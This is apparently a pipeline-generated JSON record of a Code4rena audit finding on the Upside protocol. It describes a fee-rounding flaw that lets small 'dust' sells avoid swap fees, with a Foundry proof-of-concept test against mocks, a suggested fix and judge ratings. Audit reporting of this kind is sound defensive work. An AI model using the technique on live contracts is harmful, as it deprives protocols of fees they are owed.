@@ -1,0 +1,108 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Upside_xKJfM48g3oD",
+    "audit_uid": "xKJfM48g3oD",
+    "requested_submission_uid": "JpwtWDKxVBt",
+    "requested_finding_uid": "hxQEU6w4pom",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Upside_xKJfM48g3oD/20260618_143323/findings.json",
+    "source_submission_uid": "JpwtWDKxVBt",
+    "source_finding_uid": "hxQEU6w4pom",
+    "original_report_path": "Upside_xKJfM48g3oD\\low_valid_JpwtWDKxVBt.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "JpwtWDKxVBt",
+  "finding_uid": "hxQEU6w4pom",
+  "finding_number": "52",
+  "title": "Users can bypass fees when calling the `function swap` by selling small portions.",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "",
+  "user_handle": "Fon",
+  "body": "## Finding description and impact\n\nIn the `function processSwapFee`, fees are computed with the expression \n\n```solidity\nfee = (_tokenAmount * feeInfo.swapFeeSellBp) / 10000;\n```\n\nHowever, there is no check to ensure that the product _tokenAmount * swapFeeBp is at least 10,000 before dividing; this results in a zero-fee swap, even though a non-zero basis-point fee was intended.\n\nUsers can repeatedly swap “dust” amounts below the threshold without paying fees, depriving the protocol (or fee recipient) of expected income.\n\n## Recommended mitigation steps\n\nrequire that _tokenAmount meets a minimum size:\n\n```solidity\nrequire(_tokenAmount * swapFeeBp >= 10000, \"Amount too small to cover fee\");\n```",
+  "proof_of_concept": "pragma solidity 0.8.24;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {UpsideStakingStub} from \"../contracts/UpsideStakingStub.sol\";\nimport {UpsideProtocol} from \"../contracts/UpsideProtocol.sol\";\nimport {USDCMock} from \"../contracts/mock/USDCMock.sol\";\nimport {console} from \"forge-std/console.sol\";\n\ncontract POC is Test {\n    UpsideStakingStub public stakingStub;\n    UpsideProtocol public upsideProtocol;\n    USDCMock public liquidityToken;\n\n    address public alice;\n    address public bob;\n\n    function setUp() public {\n        stakingStub = new UpsideStakingStub(address(this));\n        stakingStub.setFeeDestinationAddress(address(this));\n\n        liquidityToken = new USDCMock();\n        upsideProtocol = new UpsideProtocol(address(this));\n\n        upsideProtocol.init(address(liquidityToken));   \n        upsideProtocol.setStakingContractAddress(address(stakingStub));\n\n        alice = makeAddr(\"alice\");\n        bob = makeAddr(\"bob\");\n    }\n\n    function test_FreeSwap() public {\n        liquidityToken.mint(alice, 1000e6);\n        \n        UpsideProtocol.FeeInfo memory _newFeeInfo = UpsideProtocol.FeeInfo({\n            tokenizeFeeDestinationAddress : address(this),\n            swapFeeDecayInterval : 1 weeks,\n            tokenizeFeeEnabled : false,\n            swapFeeStartingBp : 200,\n            swapFeeDecayBp : 200,\n            swapFeeFinalBp : 200,\n            swapFeeSellBp : 200,\n            swapFeeDeployerBp : 200\n        });\n        upsideProtocol.setFeeInfo(_newFeeInfo);\n\n        vm.startPrank(alice);\n        address metacoin = upsideProtocol.tokenize(\"https://code4rena.com/\", address(liquidityToken));\n\n        liquidityToken.approve(address(upsideProtocol), 10e6);\n\n        // this test contract is the fee destination address\n        // as theres no sell, the balance is zero\n        uint256 selfbalance = IERC20(metacoin).balanceOf(address(this));\n        assertEq(selfbalance, 0, \"Self balance should be zero\");\n\n        // alice buys metacoin\n        upsideProtocol.swap(metacoin, true, 10e6, 0, alice);\n\n        // alice then sells metacoin back to USDC\n        IERC20(metacoin).approve(address(upsideProtocol), 10e6);\n        upsideProtocol.swap(metacoin, false, 10, 0, alice);\n\n        // but since the amount is too small the protocol doesnt collect any fee\n        selfbalance = IERC20(metacoin).balanceOf(address(this));\n        assertEq(selfbalance, 0, \"Self balance should be zero\");\n\n        vm.stopPrank();\n\n    }\n        \n}",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L250-L256"
+  ],
+  "source_record": {
+    "project_id": "xKJfM48g3oD",
+    "submission_index": "639",
+    "api_submission_id": "",
+    "uid": "JpwtWDKxVBt",
+    "number": "639",
+    "title": "Users can bypass fees when calling the `function swap` by selling small portions.",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "",
+    "handle": "Fon",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L250-L256"
+    ],
+    "body": "## Finding description and impact\n\nIn the `function processSwapFee`, fees are computed with the expression \n\n```solidity\nfee = (_tokenAmount * feeInfo.swapFeeSellBp) / 10000;\n```\n\nHowever, there is no check to ensure that the product _tokenAmount * swapFeeBp is at least 10,000 before dividing; this results in a zero-fee swap, even though a non-zero basis-point fee was intended.\n\nUsers can repeatedly swap “dust” amounts below the threshold without paying fees, depriving the protocol (or fee recipient) of expected income.\n\n## Recommended mitigation steps\n\nrequire that _tokenAmount meets a minimum size:\n\n```solidity\nrequire(_tokenAmount * swapFeeBp >= 10000, \"Amount too small to cover fee\");\n```",
+    "proof_of_concept": "pragma solidity 0.8.24;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {UpsideStakingStub} from \"../contracts/UpsideStakingStub.sol\";\nimport {UpsideProtocol} from \"../contracts/UpsideProtocol.sol\";\nimport {USDCMock} from \"../contracts/mock/USDCMock.sol\";\nimport {console} from \"forge-std/console.sol\";\n\ncontract POC is Test {\n    UpsideStakingStub public stakingStub;\n    UpsideProtocol public upsideProtocol;\n    USDCMock public liquidityToken;\n\n    address public alice;\n    address public bob;\n\n    function setUp() public {\n        stakingStub = new UpsideStakingStub(address(this));\n        stakingStub.setFeeDestinationAddress(address(this));\n\n        liquidityToken = new USDCMock();\n        upsideProtocol = new UpsideProtocol(address(this));\n\n        upsideProtocol.init(address(liquidityToken));   \n        upsideProtocol.setStakingContractAddress(address(stakingStub));\n\n        alice = makeAddr(\"alice\");\n        bob = makeAddr(\"bob\");\n    }\n\n    function test_FreeSwap() public {\n        liquidityToken.mint(alice, 1000e6);\n        \n        UpsideProtocol.FeeInfo memory _newFeeInfo = UpsideProtocol.FeeInfo({\n            tokenizeFeeDestinationAddress : address(this),\n            swapFeeDecayInterval : 1 weeks,\n            tokenizeFeeEnabled : false,\n            swapFeeStartingBp : 200,\n            swapFeeDecayBp : 200,\n            swapFeeFinalBp : 200,\n            swapFeeSellBp : 200,\n            swapFeeDeployerBp : 200\n        });\n        upsideProtocol.setFeeInfo(_newFeeInfo);\n\n        vm.startPrank(alice);\n        address metacoin = upsideProtocol.tokenize(\"https://code4rena.com/\", address(liquidityToken));\n\n        liquidityToken.approve(address(upsideProtocol), 10e6);\n\n        // this test contract is the fee destination address\n        // as theres no sell, the balance is zero\n        uint256 selfbalance = IERC20(metacoin).balanceOf(address(this));\n        assertEq(selfbalance, 0, \"Self balance should be zero\");\n\n        // alice buys metacoin\n        upsideProtocol.swap(metacoin, true, 10e6, 0, alice);\n\n        // alice then sells metacoin back to USDC\n        IERC20(metacoin).approve(address(upsideProtocol), 10e6);\n        upsideProtocol.swap(metacoin, false, 10, 0, alice);\n\n        // but since the amount is too small the protocol doesnt collect any fee\n        selfbalance = IERC20(metacoin).balanceOf(address(this));\n        assertEq(selfbalance, 0, \"Self balance should be zero\");\n\n        vm.stopPrank();\n\n    }\n        \n}",
+    "detail_url": "https://code4rena.com/api/v1/audits/xKJfM48g3oD/submissions/639",
+    "raw": {
+      "auditUid": "xKJfM48g3oD",
+      "createdAt": "2025-05-26T18:41:13.683Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "QRsD8moU94y",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-05-21T19:09:28.704Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "hxQEU6w4pom"
+        },
+        {
+          "uid": "b2XBBrH8GJL",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-05-21T19:09:31.027Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "hxQEU6w4pom"
+        }
+      ],
+      "finding": {
+        "uid": "hxQEU6w4pom",
+        "number": 52,
+        "duplicates": 27
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": null,
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2025-05-27T19:58:23.090Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "Users can bypass fees when calling the `function swap` by selling small portions.",
+      "uid": "JpwtWDKxVBt",
+      "updatedAt": "2025-05-26T19:03:54.373Z",
+      "user": {
+        "uid": "YCqwG25XY5s",
+        "handle": "Fon"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nIn the `function processSwapFee`, fees are computed with the expression \n\n```solidity\nfee = (_tokenAmount * feeInfo.swapFeeSellBp) / 10000;\n```\n\nHowever, there is no check to ensure that the product _tokenAmount * swapFeeBp is at least 10,000 before dividing; this results in a zero-fee swap, even though a non-zero basis-point fee was intended.\n\nUsers can repeatedly swap “dust” amounts below the threshold without paying fees, depriving the protocol (or fee recipient) of expected income.\n\n## Recommended mitigation steps\n\nrequire that _tokenAmount meets a minimum size:\n\n```solidity\nrequire(_tokenAmount * swapFeeBp >= 10000, \"Amount too small to cover fee\");\n```",
+      "proofOfConcept": "pragma solidity 0.8.24;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {UpsideStakingStub} from \"../contracts/UpsideStakingStub.sol\";\nimport {UpsideProtocol} from \"../contracts/UpsideProtocol.sol\";\nimport {USDCMock} from \"../contracts/mock/USDCMock.sol\";\nimport {console} from \"forge-std/console.sol\";\n\ncontract POC is Test {\n    UpsideStakingStub public stakingStub;\n    UpsideProtocol public upsideProtocol;\n    USDCMock public liquidityToken;\n\n    address public alice;\n    address public bob;\n\n    function setUp() public {\n        stakingStub = new UpsideStakingStub(address(this));\n        stakingStub.setFeeDestinationAddress(address(this));\n\n        liquidityToken = new USDCMock();\n        upsideProtocol = new UpsideProtocol(address(this));\n\n        upsideProtocol.init(address(liquidityToken));   \n        upsideProtocol.setStakingContractAddress(address(stakingStub));\n\n        alice = makeAddr(\"alice\");\n        bob = makeAddr(\"bob\");\n    }\n\n    function test_FreeSwap() public {\n        liquidityToken.mint(alice, 1000e6);\n        \n        UpsideProtocol.FeeInfo memory _newFeeInfo = UpsideProtocol.FeeInfo({\n            tokenizeFeeDestinationAddress : address(this),\n            swapFeeDecayInterval : 1 weeks,\n            tokenizeFeeEnabled : false,\n            swapFeeStartingBp : 200,\n            swapFeeDecayBp : 200,\n            swapFeeFinalBp : 200,\n            swapFeeSellBp : 200,\n            swapFeeDeployerBp : 200\n        });\n        upsideProtocol.setFeeInfo(_newFeeInfo);\n\n        vm.startPrank(alice);\n        address metacoin = upsideProtocol.tokenize(\"https://code4rena.com/\", address(liquidityToken));\n\n        liquidityToken.approve(address(upsideProtocol), 10e6);\n\n        // this test contract is the fee destination address\n        // as theres no sell, the balance is zero\n        uint256 selfbalance = IERC20(metacoin).balanceOf(address(this));\n        assertEq(selfbalance, 0, \"Self balance should be zero\");\n\n        // alice buys metacoin\n        upsideProtocol.swap(metacoin, true, 10e6, 0, alice);\n\n        // alice then sells metacoin back to USDC\n        IERC20(metacoin).approve(address(upsideProtocol), 10e6);\n        upsideProtocol.swap(metacoin, false, 10, 0, alice);\n\n        // but since the amount is too small the protocol doesnt collect any fee\n        selfbalance = IERC20(metacoin).balanceOf(address(this));\n        assertEq(selfbalance, 0, \"Self balance should be zero\");\n\n        vm.stopPrank();\n\n    }\n        \n}",
+      "linesOfCode": "https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L250-L256",
+      "number": 639,
+      "aiExplanation": null,
+      "_index": 639
+    }
+  }
+}
